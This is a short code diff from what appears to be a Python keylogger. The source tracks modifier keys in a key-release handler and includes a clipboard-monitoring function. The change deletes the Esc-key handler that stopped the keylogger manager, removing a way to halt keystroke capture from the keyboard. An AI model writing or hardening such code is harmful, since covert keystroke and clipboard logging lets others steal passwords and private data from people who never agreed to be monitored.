@@ -156,9 +156,6 @@ def on_release(key):
         shift_pressed = False
     elif key == keyboard.Key.alt or key == keyboard.Key.alt_r:
         alt_pressed = False
-    if key == keyboard.Key.esc:
-        keylogger_manager.stop()
-        return False
 
 def clipboard_monitor(interval=5):
     import pyperclip
